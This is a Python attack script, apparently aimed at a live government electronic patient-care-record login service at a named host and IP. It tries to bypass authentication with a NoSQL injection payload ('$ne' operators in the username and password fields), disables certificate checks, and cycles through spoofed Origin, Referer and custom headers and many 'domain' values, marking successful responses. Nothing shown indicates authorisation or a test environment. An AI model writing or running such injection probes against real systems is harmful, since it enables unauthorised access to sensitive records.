import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(headers,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    h={"Content-Type":"application/json"}; h.update(headers)
    try:
        r=s.post(BASE+"/login",data=json.dumps({"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),headers=h,timeout=12)
        return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== source 403 是否基于请求头 ===")
tests={
  "no origin": {},
  "Origin epcr": {"Origin":"https://epcr.tpf.gov.tw:4004"},
  "Referer epcr": {"Referer":"https://epcr.tpf.gov.tw:4004/"},
  "Origin localhost": {"Origin":"http://localhost:3000"},
  "X-Source": {"X-Source":"PORTAL"},
  "source in body+header": {"Source":"PORTAL"},
  "domain header": {"X-Domain":"AUTH_SERVER"},
}
for tag,h in tests.items():
    code,b=login(h,tag)
    print(f"  {tag:22s} -> {code} | {b[:65]}")
    time.sleep(0.1)
# 也测试 body domain 各种值
print("\n=== body domain 值测试 ===")
def login2(domain,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    r=s.post(BASE+"/login",json={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":domain},timeout=12)
    return r.status_code, r.text
for d in ["AUTH_SERVER","PORTAL","WEB","API","localhost","epcr.tpf.gov.tw","SYSTEM","PORT","EMERGENCY","118.163.107.93"]:
    code,b=login2(d,d)
    mark=" ***" if code in (200,302) else ""
    print(f"  domain={d:20s} -> {code} | {b[:55]}{mark}")
    time.sleep(0.1)
print("DONE")
